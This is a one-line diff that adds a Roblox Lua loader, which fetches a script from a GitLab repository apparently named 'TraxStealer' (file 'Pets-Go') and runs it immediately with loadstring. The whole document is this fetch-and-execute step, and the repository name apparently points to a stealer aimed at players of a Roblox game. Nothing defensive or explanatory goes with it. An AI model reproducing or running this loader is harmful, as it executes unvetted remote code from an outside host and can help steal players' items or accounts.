@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gitlab.com/traxscripts/TraxStealer/-/raw/main/Pets-Go"))()
